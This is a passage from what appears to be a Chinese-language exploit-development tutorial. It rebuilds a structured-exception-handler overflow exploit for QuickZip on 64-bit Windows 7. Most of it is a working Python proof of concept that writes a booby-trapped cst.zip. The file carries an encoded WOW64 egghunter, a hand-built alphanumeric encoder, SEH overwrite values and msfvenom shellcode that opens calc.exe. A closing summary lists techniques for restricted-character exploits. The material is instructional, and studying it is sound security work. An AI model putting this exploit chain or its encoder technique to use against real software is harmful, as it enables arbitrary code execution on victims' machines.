    print "[+] Building PoC.."
    max_size = 4064
    nseh_offset = 292
    jump_offset = 92
    # msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
    # [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
    egghunter = ("x50x59x49x49x49x49x49x49x49x49x49x49x49x49"
    "x49x49x49x49x37x51x5ax6ax41x58x50x30x41x30"
    "x41x6bx41x41x51x32x41x42x32x42x42x30x42x42"
    "x41x42x58x50x38x41x42x75x4ax49x66x51x49x4b"
    "x52x73x53x63x62x73x36x33x4ex53x6fx30x75x36"
    "x6dx51x59x5ax49x6fx36x6fx72x62x71x42x42x4a"
    "x66x46x56x38x74x73x78x49x4cx4bx4bx64x61x74"
    "x49x6fx47x63x31x4ex50x5ax77x4cx77x75x53x44"
    "x49x79x38x38x52x57x36x50x50x30x33x44x6cx4b"
    "x59x6ax4ex4fx32x55x38x64x4ex4fx70x75x6bx51"
    "x6bx4fx79x77x41x41")
    payload = egghunter
    payload += "A" * (nseh_offset - len(payload) - jump_offset) # padding for nSEH
    payload += "x41x41"   # INC ECX (acts as NOPs, but with valid character set)
    # Offset the stack by 0x632 to start writing to a controlled area of memory
    #
    payload += "x54"                   # push esp;
    payload += "x58"                   # pop eax;
    payload += "x05x33x07x01x01"   # add eax, 0x01010733
    payload += "x2dx01x01x01x01"   # sub eax, 0x01010101
    payload += "x50"                   # push eax;
    payload += "x5c"                   # pop esp;
    # Write instructions for: push esp; pop eax; sub eax, 0xBE; jmp eax; jmp 0xee
    #
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xeceb90e0 into EAX
    payload += "x05x70x70x77x77"   # add eax, 0x77777070
    payload += "x05x70x20x74x77"   # add eax, 0x77742070
    payload += "x50"                   # push eax;
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xff000000 into EAX
    payload += "x05x01x01x01x77"   # add eax, 0x77010101
    payload += "x05x01x01x01x77"   # add eax, 0x77010101
    payload += "x05x10x10x10x22"   # add eax, 0x22101010
    payload += "x2dx12x12x12x11"   # sub eax, 0x11121212
    payload += "x50"                   # push eax;
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xbe2d5854 into EAX
    payload += "x05x43x47x1cx67"   # add eax, 0x671c4743
    payload += "x05x11x11x11x57"   # add eax, 0x57111111
    payload += "x50"                   # push eax;
    payload += "A" * (nseh_offset - len(payload))    # padding for the rest of encoder
    payload += "x71x9bx70x9b"       # nSEH: jno $-99; jo $-99   => '9b' will actually be converted to 'a2', which is $-92
    payload += "x33x28x42x00"       # SEH
    shellcode = "w00tw00t"                     # egg
    shellcode += "x81xe4xf0xffxffxff"    # align the stack: AND esp,0xFFFFFFF0
    # msfvenom -p windows/exec CMD=calc.exe -b 'x00x0ax0d'
    # [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)
    shellcode += ("xbfxdcxaex26x3dxdaxddxd9x74x24xf4x5bx31xc9"
    "xb1x33x31x7bx12x03x7bx12x83x37x52xc4xc8x3b"
    "x43x80x33xc3x94xf3xbax26xa5x21xd8x23x94xf5"
    "xaax61x15x7dxfex91xaexf3xd7x96x07xb9x01x99"
    "x98x0fx8ex75x5ax11x72x87x8fxf1x4bx48xc2xf0"
    "x8cxb4x2dxa0x45xb3x9cx55xe1x81x1cx57x25x8e"
    "x1dx2fx40x50xe9x85x4bx80x42x91x04x38xe8xfd"
    "xb4x39x3dx1ex88x70x4axd5x7ax83x9ax27x82xb2"
    "xe2xe4xbdx7bxefxf5xfaxbbx10x80xf0xb8xadx93"
    "xc2xc3x69x11xd7x63xf9x81x33x92x2ex57xb7x98"
    "x9bx13x9fxbcx1axf7xabxb8x97xf6x7bx49xe3xdc"
    "x5fx12xb7x7dxf9xfex16x81x19xa6xc7x27x51x44"
    "x13x51x38x02xe2xd3x46x6bxe4xebx48xdbx8dxda"
    "xc3xb4xcaxe2x01xf1x25xa9x08x53xaex74xd9xe6"
    "xb3x86x37x24xcax04xb2xd4x29x14xb7xd1x76x92"
    "x2bxabxe7x77x4cx18x07x52x2fxffx9bx3ex9ex9a"
    "x1bxa4xde")
    payload += shellcode
    payload += "A" * (max_size - len(payload))    # padding
    payload += ".txt"
    print "[+] Length = " + str(len(payload))
    exploit = header_1 + payload + header_2 + payload + header_3 + payload
    mefile = open('cst.zip','w');
    mefile.write(exploit);
    mefile.close()
    print "[+] Exploit complete!"
当我们打开生成的cst.zip文件时，我们的漏洞利用代码就会运行，几秒钟（因为egghunter通过应用程序的内存找到“蛋”）后，我们应该看到计算器被打开。
成功了！！
**小结**
在本文中，我们已经成功地重新创建了QuickZip漏洞利用代码的64位版本，它已经可以在Windows 7上运行了！
总而言之，我们通过使用非常有限的、被允许的字符集（几乎可以ASCII打印）创建了一个egghunter漏洞利用代码，编写了我们自己的编码器，并通过在内存中的跳转，到达egghunter代码，最终到达shellcode。
需要注意的是：
找出允许使用的字符，并在发生错误时记住这些字符
如果缓冲区大小不够，不要气馁——发挥你的创造性！
确保您使用正确的egghunter代码（32位与64位），具体取决于您正在开发漏洞的平台
编写自己的编码器不是那么难，但需要大量的练习和耐心
确保在执行shellcode之前对齐堆栈